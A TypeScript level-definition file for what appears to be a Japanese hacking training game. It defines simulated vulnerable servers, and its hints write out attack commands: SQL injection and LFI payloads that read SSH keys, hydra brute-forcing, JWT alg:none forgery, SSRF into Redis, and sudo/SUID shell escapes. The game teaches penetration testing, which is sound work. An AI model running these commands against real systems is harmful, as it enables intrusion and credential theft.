import { SecurityLevel, ServerConfig } from '../types/game';
import { BATCH2_CAMPAIGN_SERVERS } from './campaignBatch2';
import { BATCH3_CAMPAIGN_SERVERS } from './campaignBatch3';
import { EXTRA_CAMPAIGN_SERVERS } from './extraServers';

const BASE_CAMPAIGN_SERVERS: ServerConfig[] = [
  // =========================================================================
  // LEVEL 1: Exposed Dev Box (Security Level 1/10)
  // =========================================================================
  {
    id: 'lvl-1',
    level: 1,
    siteTemplate: 'university',
    siteBrand: {
      title: 'DevBox 01 開発ステージング',
      subtitle: '学内システム・検証用ファイル共有ポータル',
    },
    name: 'Lv.1 Exposed Dev Box',
    hostname: 'devbox-01',
    ip: '10.10.1.10',
    os: 'Ubuntu 22.04.3 LTS',
    kernel: 'Linux 5.15.0-89-generic x86_64',
    ttl: 64,
    macAddress: '00:50:56:8A:10:01',
    summary: '開発用の初期サーバー。匿名FTPやディレクトリリスティングがそのまま公開されています。',
    objective: '10.10.1.10 をスキャンして公開サービスを特定し、FTPまたはWeb経由でフラグを入手してください。',
    toolsUsed: ['nmap', 'ftp', 'curl', 'gobuster'],
    hints: [
      'まずは `nmap -sV 10.10.1.10` で開いているポートを確認しましょう。',
      'ポート21 (FTP) が anonymous ログインを許可しているか、`curl http://10.10.1.10/backup/` などのWebパスを確認できます。',
      '`ftp 10.10.1.10` でユーザー名 anonymous としてログインし `ls` → `get flag.txt`、または `gobuster dir -u http://10.10.1.10` を試してください。',
    ],
    flag: 'FLAG{lvl1_anon_ftp_and_open_backup}',
    firewall: {
      idsEnabled: false,
      blockAggressiveScans: false,
      rateLimitThreshold: 999,
      requireStealthOrTargeted: false,
    },
    services: [
      {
        id: 's1-ftp',
        port: 21,
        protocol: 'tcp',
        type: 'ftp',
        name: 'ftp',
        version: 'vsftpd 3.0.5',
        state: 'open',
        banner: '220 (vsFTPd 3.0.5) - DevBox FTP Ready',
        vulnerabilities: ['ftp_anon'],
        ftpAnonymous: true,
        ftpRoot: '/srv/ftp',
      },
      {
        id: 's1-http',
        port: 80,
        protocol: 'tcp',
        type: 'http',
        name: 'http',
        version: 'nginx 1.18.0 (Ubuntu)',
        state: 'open',
        banner: 'nginx/1.18.0',
        vulnerabilities: ['http_dir_listing'],
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'text/html',
            body: `<html><head><title>DevBox 01</title></head><body><h1>DevBox 01 - Internal Staging</h1><p>Status: Development Mode. Backups stored at /backup/</p></body></html>`,
          },
          {
            path: '/backup',
            status: 200,
            contentType: 'text/html',
            body: `Index of /backup/\n../\nnotes.txt\ndev_flag.txt\n`,
          },
          {
            path: '/backup/notes.txt',
            status: 200,
            contentType: 'text/plain',
            body: `TODO: FTPのanonymousアクセスを無効化すること。\nメモ: /backup/dev_flag.txt を削除するのを忘れないように。`,
          },
          {
            path: '/backup/dev_flag.txt',
            status: 200,
            contentType: 'text/plain',
            body: `FLAG{lvl1_anon_ftp_and_open_backup}\n`,
          },
        ],
      },
    ],
    users: [
      {
        username: 'root',
        uid: 0,
        gid: 0,
        home: '/root',
        shell: '/bin/bash',
      },
    ],
    files: [
      { path: '/srv/ftp', content: '', owner: 'ftp', group: 'ftp', permissions: 'drwxr-xr-x', isDirectory: true },
      { path: '/srv/ftp/pub', content: '', owner: 'ftp', group: 'ftp', permissions: 'drwxr-xr-x', isDirectory: true },
      {
        path: '/srv/ftp/pub/readme.txt',
        content: 'Welcome to DevBox-01 anonymous FTP!\nCheck flag.txt in this folder.\n',
        owner: 'ftp',
        group: 'ftp',
        permissions: '-rw-r--r--',
      },
      {
        path: '/srv/ftp/pub/flag.txt',
        content: 'FLAG{lvl1_anon_ftp_and_open_backup}\n',
        owner: 'ftp',
        group: 'ftp',
        permissions: '-rw-r--r--',
      },
      { path: '/root', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      {
        path: '/root/flag.txt',
        content: 'FLAG{lvl1_anon_ftp_and_open_backup}\n',
        owner: 'root',
        group: 'root',
        permissions: '-rw-------',
      },
    ],
    privescVectors: {},
  },

  // =========================================================================
  // LEVEL 2: Legacy Web Portal (Security Level 2/10)
  // =========================================================================
  {
    id: 'lvl-2',
    level: 2,
    siteTemplate: 'corporate',
    siteBrand: {
      title: 'Portal-02 社内業務ポータル',
      subtitle: '従業員向けイントラネット・お知らせ掲示板',
    },
    name: 'Lv.2 Legacy Web Portal',
    hostname: 'portal-02',
    ip: '10.10.1.20',
    os: 'Debian GNU/Linux 11 (bullseye)',
    kernel: 'Linux 5.10.0-21-amd64 x86_64',
    ttl: 64,
    macAddress: '00:50:56:8A:10:02',
    summary: 'robots.txtや隠し設定ファイル(.env)から認証情報が漏洩している社内ポータル。',
    objective: 'Webサーバーの隠しファイルやSSH総当たり攻撃を利用してSSHログインし、フラグを取得してください。',
    toolsUsed: ['nmap', 'curl', 'gobuster', 'hydra', 'ssh'],
    hints: [
      '`curl http://10.10.1.20/robots.txt` や `gobuster dir -u http://10.10.1.20` で隠しディレクトリを探してください。',
      '`/admin-backup/.env` にSSHユーザーとパスワードが記載されています（あるいは `hydra -l devuser -P /usr/share/wordlists/rockyou.txt ssh://10.10.1.20` でも突破できます）。',
      '`ssh devuser@10.10.1.20` で接続後、`cat ~/flag.txt` を実行してください。',
    ],
    flag: 'FLAG{lvl2_robots_env_ssh_breach}',
    firewall: {
      idsEnabled: false,
      blockAggressiveScans: false,
      rateLimitThreshold: 999,
      requireStealthOrTargeted: false,
    },
    services: [
      {
        id: 's2-ssh',
        port: 22,
        protocol: 'tcp',
        type: 'ssh',
        name: 'ssh',
        version: 'OpenSSH 8.4p1 Debian 5',
        state: 'open',
        banner: 'SSH-2.0-OpenSSH_8.4p1 Debian-5',
        vulnerabilities: ['ssh_weak_password'],
      },
      {
        id: 's2-http',
        port: 80,
        protocol: 'tcp',
        type: 'http',
        name: 'http',
        version: 'Apache httpd 2.4.54 ((Debian))',
        state: 'open',
        banner: 'Apache/2.4.54 (Debian)',
        vulnerabilities: ['http_robots_leak', 'http_env_leak'],
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'text/html',
            body: `<html><head><title>Corporate Portal</title></head><body><h1>Portal-02</h1><p>Welcome employees. Please sign in via SSH for maintenance.</p></body></html>`,
          },
          {
            path: '/robots.txt',
            status: 200,
            contentType: 'text/plain',
            body: `User-agent: *\nDisallow: /admin-backup/\nDisallow: /internal/\n`,
          },
          {
            path: '/admin-backup',
            status: 403,
            contentType: 'text/plain',
            body: `403 Forbidden - Directory listing denied`,
          },
          {
            path: '/admin-backup/.env',
            status: 200,
            contentType: 'text/plain',
            body: `APP_ENV=production\nSSH_HOST=10.10.1.20\nSSH_USER=devuser\nSSH_PASS=devbox99\n`,
          },
        ],
      },
    ],
    users: [
      {
        username: 'devuser',
        uid: 1000,
        gid: 1000,
        home: '/home/devuser',
        shell: '/bin/bash',
        password: 'devbox99',
      },
      {
        username: 'root',
        uid: 0,
        gid: 0,
        home: '/root',
        shell: '/bin/bash',
      },
    ],
    files: [
      { path: '/home/devuser', content: '', owner: 'devuser', group: 'devuser', permissions: 'drwxr-xr-x', isDirectory: true },
      {
        path: '/home/devuser/flag.txt',
        content: 'FLAG{lvl2_robots_env_ssh_breach}\n',
        owner: 'devuser',
        group: 'devuser',
        permissions: '-rw-r--r--',
      },
      {
        path: '/home/devuser/welcome.txt',
        content: 'Portal-02 maintenance account. Remember to rotate devbox99 password.\n',
        owner: 'devuser',
        group: 'devuser',
        permissions: '-rw-r--r--',
      },
    ],
    privescVectors: {},
  },

  // =========================================================================
  // LEVEL 3: Vulnerable Storefront (Security Level 3/10)
  // =========================================================================
  {
    id: 'lvl-3',
    level: 3,
    siteTemplate: 'ecommerce',
    siteBrand: {
      title: 'CyberShop オンラインストア',
      subtitle: 'プロフェッショナル向けPCデバイス・周辺機器ショップ',
    },
    name: 'Lv.3 Vulnerable Storefront',
    hostname: 'shop-03',
    ip: '10.10.1.30',
    os: 'Ubuntu 20.04.6 LTS',
    kernel: 'Linux 5.4.0-150-generic x86_64',
    ttl: 64,
    macAddress: '00:50:56:8A:10:03',
    summary: 'SQLインジェクション・LFI脆弱性およびMySQL外部公開があるECサイトサーバー。',
    objective: 'SQLi、LFI、またはMySQL接続のいずれかの手法で認証情報を抜き出し、ショップ管理者のフラグを奪取してください。',
    toolsUsed: ['nmap', 'curl', 'mysql', 'ssh', 'john'],
    hints: [
      'ポート80の `/search?q=...` にSQLインジェクション、`/view?file=...` にLFI脆弱性、ポート3306にMySQLがあります。',
      '`curl "http://10.10.1.30/search?q=\' OR 1=1--"` または `curl "http://10.10.1.30/view?file=../../../../home/shopadmin/.ssh/id_rsa"`、もしくは `mysql -h 10.10.1.30 -u dbuser -p` (パスワードはadmin123) を試せます。',
      '取得したパスワードまたはSSH秘密鍵を使って `ssh shopadmin@10.10.1.30` でログインし、フラグを読み取ってください。',
    ],
    flag: 'FLAG{lvl3_sqli_lfi_mysql_triple_threat}',
    firewall: {
      idsEnabled: false,
      blockAggressiveScans: false,
      rateLimitThreshold: 999,
      requireStealthOrTargeted: false,
    },
    services: [
      {
        id: 's3-ssh',
        port: 22,
        protocol: 'tcp',
        type: 'ssh',
        name: 'ssh',
        version: 'OpenSSH 8.2p1 Ubuntu 4ubuntu0.9',
        state: 'open',
        banner: 'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9',
        vulnerabilities: ['ssh_weak_password', 'ssh_key_auth'],
      },
      {
        id: 's3-http',
        port: 80,
        protocol: 'tcp',
        type: 'http',
        name: 'http',
        version: 'Apache httpd 2.4.41 ((Ubuntu))',
        state: 'open',
        banner: 'Apache/2.4.41 (Ubuntu)',
        vulnerabilities: ['http_sqli', 'http_lfi'],
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'text/html',
            body: `<html><head><title>CyberShop</title></head><body><h1>CyberShop v1.2</h1><p>Endpoints: /search?q=item | /view?file=welcome.txt</p></body></html>`,
          },
          {
            path: '/search',
            status: 200,
            contentType: 'application/json',
            body: `{"results":[{"id":1,"item":"Mechanical Keyboard","price":"$120"}]}`,
            sqliResponse: {
              vulnerableParam: 'q',
              dumpTable: 'users',
            },
          },
          {
            path: '/view',
            status: 200,
            contentType: 'text/plain',
            body: `Welcome to CyberShop! Browse our catalog.`,
            lfiEnabled: true,
          },
        ],
      },
      {
        id: 's3-mysql',
        port: 3306,
        protocol: 'tcp',
        type: 'mysql',
        name: 'mysql',
        version: 'MySQL 8.0.34-0ubuntu0.20.04.1',
        state: 'open',
        banner: '8.0.34-0ubuntu0.20.04.1',
        vulnerabilities: ['mysql_weak_auth'],
        dbUser: 'dbuser',
        dbPassword: 'admin123',
        dbTables: [
          {
            name: 'users',
            columns: ['id', 'username', 'password_hash', 'role'],
            rows: [
              { id: '1', username: 'shopadmin', password_hash: '5f4dcc3b5aa765d61d8327deb882cf99', role: 'admin' },
              { id: '2', username: 'guest', password_hash: 'e10adc3949ba59abbe56e057f20f883e', role: 'user' },
            ],
          },
          {
            name: 'secrets',
            columns: ['key_name', 'secret_value'],
            rows: [
              { key_name: 'shop_flag_backup', secret_value: 'FLAG{lvl3_sqli_lfi_mysql_triple_threat}' },
            ],
          },
        ],
      },
    ],
    users: [
      {
        username: 'shopadmin',
        uid: 1001,
        gid: 1001,
        home: '/home/shopadmin',
        shell: '/bin/bash',
        password: 'password',
        sshAuthorizedKeys: ['SHOPADMIN_KEY_2025'],
      },
      {
        username: 'root',
        uid: 0,
        gid: 0,
        home: '/root',
        shell: '/bin/bash',
      },
    ],
    files: [
      { path: '/home/shopadmin', content: '', owner: 'shopadmin', group: 'shopadmin', permissions: 'drwxr-xr-x', isDirectory: true },
      { path: '/home/shopadmin/.ssh', content: '', owner: 'shopadmin', group: 'shopadmin', permissions: 'drwx------', isDirectory: true },
      {
        path: '/home/shopadmin/.ssh/id_rsa',
        content: `-----BEGIN OPENSSH PRIVATE KEY-----\nSHOPADMIN_KEY_2025\n-----END OPENSSH PRIVATE KEY-----\n`,
        owner: 'shopadmin',
        group: 'shopadmin',
        permissions: '-rw-------',
      },
      {
        path: '/home/shopadmin/flag.txt',
        content: 'FLAG{lvl3_sqli_lfi_mysql_triple_threat}\n',
        owner: 'shopadmin',
        group: 'shopadmin',
        permissions: '-rw-r--r--',
      },
    ],
    privescVectors: {},
  },

  // =========================================================================
  // LEVEL 4: Forgotten Backdoor & SUID (Security Level 4/10)
  // =========================================================================
  {
    id: 'lvl-4',
    level: 4,
    name: 'Lv.4 Forgotten Backdoor & SUID',
    hostname: 'legacy-04',
    ip: '10.10.1.40',
    os: 'Debian GNU/Linux 10 (buster)',
    kernel: 'Linux 4.19.0-24-amd64 x86_64',
    ttl: 64,
    macAddress: '00:50:56:8A:10:04',
    summary: '古いFTPデーモン(vsftpd 2.3.4)のバックドアとSUIDバイナリによる権限昇格が存在するサーバー。',
    objective: 'vsftpd 2.3.4のエクスプロイトまたはSSHブルートフォースで侵入し、SUID権限昇格で /root/flag.txt を奪取してください。',
    toolsUsed: ['nmap', 'searchsploit', 'exploit', 'hydra', 'ssh', 'find'],
    hints: [
      '`nmap -sV 10.10.1.40` で `vsftpd 2.3.4` を確認し、`searchsploit vsftpd 2.3.4` でCVEを調べましょう。',
      '`exploit CVE-2011-2523 10.10.1.40` で初期シェルを獲得するか、`hydra -l worker -P /usr/share/wordlists/rockyou.txt ssh://10.10.1.40` でログインします。',
      'シェル内で `find / -perm -4000 2>/dev/null` を実行すると `/usr/bin/python3` にSUIDが付与されています。`/usr/bin/python3 -c "import os; os.setuid(0)"` でrootに昇格し `/root/flag.txt` を読んでください。',
    ],
    flag: 'FLAG{lvl4_vsftpd_backdoor_suid_root}',
    firewall: {
      idsEnabled: false,
      blockAggressiveScans: false,
      rateLimitThreshold: 999,
      requireStealthOrTargeted: false,
    },
    services: [
      {
        id: 's4-ftp',
        port: 21,
        protocol: 'tcp',
        type: 'ftp',
        name: 'ftp',
        version: 'vsftpd 2.3.4',
        state: 'open',
        banner: '220 (vsFTPd 2.3.4)',
        vulnerabilities: ['vsftpd_234_backdoor'],
        ftpAnonymous: false,
        shellUser: 'worker',
      },
      {
        id: 's4-ssh',
        port: 22,
        protocol: 'tcp',
        type: 'ssh',
        name: 'ssh',
        version: 'OpenSSH 7.9p1 Debian 10',
        state: 'open',
        banner: 'SSH-2.0-OpenSSH_7.9p1 Debian-10',
        vulnerabilities: ['ssh_weak_password'],
      },
    ],
    users: [
      {
        username: 'worker',
        uid: 1000,
        gid: 1000,
        home: '/home/worker',
        shell: '/bin/bash',
        password: 'dragon',
      },
      {
        username: 'root',
        uid: 0,
        gid: 0,
        home: '/root',
        shell: '/bin/bash',
      },
    ],
    files: [
      { path: '/home/worker', content: '', owner: 'worker', group: 'worker', permissions: 'drwxr-xr-x', isDirectory: true },
      {
        path: '/home/worker/note.txt',
        content: 'TODO: Check SUID binaries on this legacy system before migration.\n',
        owner: 'worker',
        group: 'worker',
        permissions: '-rw-r--r--',
      },
      {
        path: '/usr/bin/python3',
        content: '[ELF 64-bit LSB executable]',
        owner: 'root',
        group: 'root',
        permissions: '-rwsr-xr-x',
        execHint: 'SUID bit set! Run: python3 -c "import os; os.setuid(0)" to escalate to root.',
      },
      { path: '/root', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      {
        path: '/root/flag.txt',
        content: 'FLAG{lvl4_vsftpd_backdoor_suid_root}\n',
        owner: 'root',
        group: 'root',
        permissions: '-rw-------',
      },
    ],
    privescVectors: {
      suidBinaries: [
        {
          path: '/usr/bin/python3',
          exploitCmd: 'python3 -c "import os; os.setuid(0)"',
        },
      ],
    },
  },

  // =========================================================================
  // LEVEL 5: Apache Traversal & Sudo Misconfig (Security Level 5/10)
  // =========================================================================
  {
    id: 'lvl-5',
    level: 5,
    siteTemplate: 'devops',
    siteBrand: {
      title: 'WebApp-05 デプロイメント管理',
      subtitle: 'ビルドパイプライン & リリース制御ダッシュボード',
    },
    name: 'Lv.5 Apache Traversal & Sudo Abuse',
    hostname: 'webapp-05',
    ip: '10.10.1.50',
    os: 'Ubuntu 22.04.2 LTS',
    kernel: 'Linux 5.15.0-76-generic x86_64',
    ttl: 64,
    macAddress: '00:50:56:8A:10:05',
    summary: 'Apache 2.4.49のパストラバーサル(CVE-2021-41773)や.git漏洩から鍵を奪取し、sudo権限でroot化する中級ターゲット。',
    objective: 'ポート8080の脆弱なApacheまたは.git漏洩を利用してSSH鍵を取得し、sudo設定の不備を突いて /root/flag.txt を読んでください。',
    toolsUsed: ['nmap', 'curl', 'gobuster', 'searchsploit', 'exploit', 'ssh', 'sudo'],
    hints: [
      '`nmap -p- 10.10.1.50` または `nmap -sV -p 22,8080 10.10.1.50` でポート8080の `Apache/2.4.49` を発見できます。',
      '`exploit CVE-2021-41773 10.10.1.50 8080` または `curl http://10.10.1.50:8080/.git/config` でユーザー `deploy` のSSH秘密鍵 (`/home/deploy/.ssh/id_rsa`) を入手できます。',
      '`ssh -i id_rsa deploy@10.10.1.50` でログイン後、`sudo -l` を確認すると `NOPASSWD: /usr/bin/vim` が許可されています。`sudo vim -c "!sh"` でrootシェルになります。',
    ],
    flag: 'FLAG{lvl5_apache2449_and_sudo_vim_escape}',
    firewall: {
      idsEnabled: false,
      blockAggressiveScans: false,
      rateLimitThreshold: 999,
      requireStealthOrTargeted: false,
    },
    services: [
      {
        id: 's5-ssh',
        port: 22,
        protocol: 'tcp',
        type: 'ssh',
        name: 'ssh',
        version: 'OpenSSH 8.9p1 Ubuntu 3ubuntu0.4',
        state: 'open',
        banner: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4',
        vulnerabilities: ['ssh_key_auth'],
      },
      {
        id: 's5-http',
        port: 8080,
        protocol: 'tcp',
        type: 'http',
        name: 'http',
        version: 'Apache httpd 2.4.49 ((Unix))',
        state: 'open',
        banner: 'Apache/2.4.49 (Unix)',
        vulnerabilities: ['http_path_traversal_2449', 'http_git_leak'],
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'text/html',
            body: `<html><head><title>WebApp 05</title></head><body><h1>Deployment Dashboard</h1><p>Apache 2.4.49 running on port 8080.</p></body></html>`,
          },
          {
            path: '/.git/HEAD',
            status: 200,
            contentType: 'text/plain',
            body: `ref: refs/heads/main\n`,
          },
          {
            path: '/.git/config',
            status: 200,
            contentType: 'text/plain',
            body: `[core]\n\trepositoryformatversion = 0\n[user]\n\tname = deploy\n\tssh_key_path = /home/deploy/.ssh/id_rsa\n[backup]\n\tkey_copy = /backup_key.pem\n`,
          },
          {
            path: '/backup_key.pem',
            status: 200,
            contentType: 'text/plain',
            body: `-----BEGIN OPENSSH PRIVATE KEY-----\nDEPLOY_KEY_LVL5_9981\n-----END OPENSSH PRIVATE KEY-----\n`,
            hiddenFromRobots: true,
          },
        ],
      },
    ],
    users: [
      {
        username: 'deploy',
        uid: 1002,
        gid: 1002,
        home: '/home/deploy',
        shell: '/bin/bash',
        sshAuthorizedKeys: ['DEPLOY_KEY_LVL5_9981'],
        sudoRules: ['(ALL) NOPASSWD: /usr/bin/vim'],
      },
      {
        username: 'root',
        uid: 0,
        gid: 0,
        home: '/root',
        shell: '/bin/bash',
      },
    ],
    files: [
      { path: '/home/deploy', content: '', owner: 'deploy', group: 'deploy', permissions: 'drwxr-xr-x', isDirectory: true },
      { path: '/home/deploy/.ssh', content: '', owner: 'deploy', group: 'deploy', permissions: 'drwx------', isDirectory: true },
      {
        path: '/home/deploy/.ssh/id_rsa',
        content: `-----BEGIN OPENSSH PRIVATE KEY-----\nDEPLOY_KEY_LVL5_9981\n-----END OPENSSH PRIVATE KEY-----\n`,
        owner: 'deploy',
        group: 'deploy',
        permissions: '-rw-------',
      },
      { path: '/root', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      {
        path: '/root/flag.txt',
        content: 'FLAG{lvl5_apache2449_and_sudo_vim_escape}\n',
        owner: 'root',
        group: 'root',
        permissions: '-rw-------',
      },
    ],
    privescVectors: {
      sudoAbuse: [
        {
          binary: '/usr/bin/vim',
          exploitCmd: 'sudo vim -c "!sh"',
        },
      ],
    },
  },

  // =========================================================================
  // LEVEL 6: Hardened Cache & Firewall (Security Level 6/10)
  // =========================================================================
  {
    id: 'lvl-6',
    level: 6,
    siteTemplate: 'devops',
    siteBrand: {
      title: 'Cache-06 プロキシゲートウェイ',
      subtitle: '内部キャッシュ検証 & リモートコンテンツ取得サービス',
    },
    name: 'Lv.6 Hardened Cache & IDS',
    hostname: 'cache-06',
    ip: '10.10.1.60',
    os: 'Alpine Linux 3.18',
    kernel: 'Linux 6.1.38-0-lts x86_64',
    ttl: 64,
    macAddress: '00:50:56:8A:10:06',
    summary: 'IDSとレート制限ファイアウォールが稼働中。派手なスキャン(-T4/-T5/-A)を検知して遮断します。ステルススキャンとRedis/SSRFを突破せよ。',
    objective: 'IDSを回避してポート6379(Redis)またはSSRFを発見し、書き換え可能なcronジョブでroot権限を奪取してください。',
    toolsUsed: ['nmap', 'redis-cli', 'curl', 'ssh'],
    hints: [
      '通常の `nmap -T5` や `-A` はIDSに検知されポートが filtered になります。`nmap -sS -T2 -p 22,80,6379 10.10.1.60` のようにステルススキャンを使用してください。',
      '`redis-cli -h 10.10.1.60` で `KEYS *` → `GET ssh_key`、または `curl "http://10.10.1.60/fetch?url=http://127.0.0.1:6379/secret"` (SSRF) でSSH秘密鍵を取得できます。',
      '`ssh -i id_rsa cacheop@10.10.1.60` でログイン後、`/etc/cron.d/cleanup` が参照する `/opt/scripts/cleanup.sh` に書き込み権限があります。追記または `exploit cron` でroot昇格！',
    ],
    flag: 'FLAG{lvl6_stealth_scan_redis_cron_pwn}',
    firewall: {
      idsEnabled: true,
      blockAggressiveScans: true,
      rateLimitThreshold: 6,
      requireStealthOrTargeted: true,
      decoyFilteredPorts: [23, 445, 3389],
    },
    services: [
      {
        id: 's6-ssh',
        port: 22,
        protocol: 'tcp',
        type: 'ssh',
        name: 'ssh',
        version: 'OpenSSH 9.3p1',
        state: 'open',
        banner: 'SSH-2.0-OpenSSH_9.3',
        vulnerabilities: ['ssh_key_auth'],
      },
      {
        id: 's6-http',
        port: 80,
        protocol: 'tcp',
        type: 'http',
        name: 'http',
        version: 'nginx 1.24.0 (Alpine)',
        state: 'open',
        banner: 'nginx/1.24.0',
        vulnerabilities: ['http_ssrf'],
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'text/html',
            body: `<html><head><title>Cache-06 Proxy</title></head><body><h1>URL Fetcher Service</h1><p>Usage: /fetch?url=https://example.com</p></body></html>`,
          },
          {
            path: '/fetch',
            status: 200,
            contentType: 'text/plain',
            body: `Proxy fetcher ready. Provide ?url= parameter.`,
            ssrfInternalTarget: `INTERNAL REDIS DUMP:\nssh_user=cacheop\nssh_key=-----BEGIN OPENSSH PRIVATE KEY-----\nCACHEOP_KEY_LVL6_4410\n-----END OPENSSH PRIVATE KEY-----\n`,
          },
        ],
      },
      {
        id: 's6-redis',
        port: 6379,
        protocol: 'tcp',
        type: 'redis',
        name: 'redis',
        version: 'Redis 6.0.9',
        state: 'open',
        banner: '+PONG',
        vulnerabilities: ['redis_unauth'],
        redisKeys: {
          'app:env': 'production',
          'ssh_user': 'cacheop',
          'ssh_key': '-----BEGIN OPENSSH PRIVATE KEY-----\nCACHEOP_KEY_LVL6_4410\n-----END OPENSSH PRIVATE KEY-----',
        },
      },
    ],
    users: [
      {
        username: 'cacheop',
        uid: 1000,
        gid: 1000,
        home: '/home/cacheop',
        shell: '/bin/sh',
        sshAuthorizedKeys: ['CACHEOP_KEY_LVL6_4410'],
      },
      {
        username: 'root',
        uid: 0,
        gid: 0,
        home: '/root',
        shell: '/bin/sh',
      },
    ],
    files: [
      { path: '/home/cacheop', content: '', owner: 'cacheop', group: 'cacheop', permissions: 'drwxr-xr-x', isDirectory: true },
      {
        path: '/etc/cron.d/cleanup',
        content: `* * * * * root /opt/scripts/cleanup.sh\n`,
        owner: 'root',
        group: 'root',
        permissions: '-rw-r--r--',
      },
      {
        path: '/opt/scripts/cleanup.sh',
        content: `#!/bin/sh\nrm -rf /tmp/cache_*\n`,
        owner: 'root',
        group: 'cacheop',
        permissions: '-rwxrwxr-x',
      },
      { path: '/root', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      {
        path: '/root/flag.txt',
        content: 'FLAG{lvl6_stealth_scan_redis_cron_pwn}\n',
        owner: 'root',
        group: 'root',
        permissions: '-rw-------',
      },
    ],
    privescVectors: {
      cronWritable: [
        {
          path: '/etc/cron.d/cleanup',
          targetScript: '/opt/scripts/cleanup.sh',
        },
      ],
    },
  },

  // =========================================================================
  // LEVEL 7: DNS Zone Transfer & JWT Forgery (Security Level 7/10)
  // =========================================================================
  {
    id: 'lvl-7',
    level: 7,
    siteTemplate: 'corporate',
    siteBrand: {
      title: 'Corp Auth Gateway',
      subtitle: '社内マイクロサービス統合認証・トークン発行ポータル',
    },
    name: 'Lv.7 DNS AXFR & JWT Forgery',
    hostname: 'corp-07',
    ip: '10.10.1.70',
    os: 'Ubuntu 22.04.3 LTS',
    kernel: 'Linux 5.15.0-91-generic x86_64',
    ttl: 64,
    macAddress: '00:50:56:8A:10:07',
    summary: 'DNSゾーン転送(AXFR)で内部APIのURLとJWTトークンが露出し、弱いJWT署名検証を悪用して管理者APIから鍵を奪取するターゲット。',
    objective: 'DNSのAXFRで秘密エンドポイントを発見し、JWTを改ざん/クラックして管理者APIにアクセス後、フラグを取得してください。',
    toolsUsed: ['nmap', 'dig', 'curl', 'jwt-tool', 'john', 'ssh'],
    hints: [
      '`dig @10.10.1.70 axfr corp.local` でDNSゾーン転送を実行し、隠しサブドメインやTXTレコードを確認しましょう。',
      'ポート443 (HTTPS) の `/api/token` でゲスト用JWTを取得し、`jwt-tool` でデコード/署名改ざん (`alg: none` または秘密鍵 `secret99` を `john` でクラック) して `role: admin` のJWTを作成します。',
      '偽造JWTを `curl -H "Authorization: Bearer <JWT>" https://10.10.1.70/api/admin/ssh-key` に渡してSSH鍵を入手し、`/root/flag.txt` または `/home/secadmin/flag.txt` を読み取ってください。',
    ],
    flag: 'FLAG{lvl7_dns_axfr_jwt_alg_none_admin}',
    firewall: {
      idsEnabled: true,
      blockAggressiveScans: true,
      rateLimitThreshold: 8,
      requireStealthOrTargeted: false,
    },
    services: [
      {
        id: 's7-ssh',
        port: 22,
        protocol: 'tcp',
        type: 'ssh',
        name: 'ssh',
        version: 'OpenSSH 8.9p1 Ubuntu 3ubuntu0.6',
        state: 'open',
        banner: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6',
        vulnerabilities: ['ssh_key_auth'],
      },
      {
        id: 's7-dns',
        port: 53,
        protocol: 'tcp',
        type: 'dns',
        name: 'domain',
        version: 'ISC BIND 9.18.18',
        state: 'open',
        banner: 'ISC BIND 9.18.18',
        vulnerabilities: ['dns_axfr', 'dns_txt_secret'],
        dnsZoneTransfer: true,
        dnsRecords: [
          { type: 'A', name: 'corp.local', value: '10.10.1.70' },
          { type: 'A', name: 'internal-api.corp.local', value: '10.10.1.70' },
          { type: 'TXT', name: 'corp.local', value: 'api-endpoints: /api/token , /api/admin/ssh-key' },
          { type: 'TXT', name: 'jwt-hint.corp.local', value: 'hash:secret99 (weak HS256 or alg:none supported)' },
        ],
      },
      {
        id: 's7-https',
        port: 443,
        protocol: 'tcp',
        type: 'https',
        name: 'https',
        version: 'nginx 1.24.0 (TLS 1.3)',
        state: 'open',
        banner: 'nginx/1.24.0',
        vulnerabilities: ['http_jwt_weak'],
        webRoutes: [
          {
            path: '/',
            status: 200,
            contentType: 'application/json',
            body: `{"service":"Corp Auth API","status":"ok","hint":"Check DNS records for internal routes"}`,
          },
          {
            path: '/api/token',
            status: 200,
            contentType: 'application/json',
            body: `{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiZ3Vlc3QifQ.sig_secret99_guest"}`,
          },
          {
            path: '/api/admin/ssh-key',
            status: 200,
            contentType: 'application/json',
            body: `{"user":"secadmin","private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\\nSECADMIN_KEY_LVL7_8821\\n-----END OPENSSH PRIVATE KEY-----"}`,
            requiresAuth: {
              type: 'bearer_jwt',
              secret: 'secret99',
            },
          },
        ],
      },
    ],
    users: [
      {
        username: 'secadmin',
        uid: 1000,
        gid: 1000,
        home: '/home/secadmin',
        shell: '/bin/bash',
        sshAuthorizedKeys: ['SECADMIN_KEY_LVL7_8821'],
        sudoRules: ['(ALL) NOPASSWD: /usr/bin/find'],
      },
      {
        username: 'root',
        uid: 0,
        gid: 0,
        home: '/root',
        shell: '/bin/bash',
      },
    ],
    files: [
      { path: '/home/secadmin', content: '', owner: 'secadmin', group: 'secadmin', permissions: 'drwxr-xr-x', isDirectory: true },
      {
        path: '/home/secadmin/readme.txt',
        content: 'You made it via JWT forgery! Now escalate to root using sudo -l.\n',
        owner: 'secadmin',
        group: 'secadmin',
        permissions: '-rw-r--r--',
      },
      { path: '/root', content: '', owner: 'root', group: 'root', permissions: 'drwx------', isDirectory: true },
      {
        path: '/root/flag.txt',
        content: 'FLAG{lvl7_dns_axfr_jwt_alg_none_admin}\n',
        owner: 'root',
        group: 'root',
        permissions: '-rw-------',
      },
    ],
    privescVectors: {
      sudoAbuse: [
        {
          binary: '/usr/bin/find',
          exploitCmd: 'sudo find . -exec /bin/sh \\;',
        },
      ],
    },
  },

  // =========================================================================
  // LEVEL 8: Command Injection, Shadow Crack & Baron Samedit (Security Level 8/10)
  // =========================================================================
  {
    id: 'lvl-8',
    level: 8,
    siteTemplate: 'logistics',
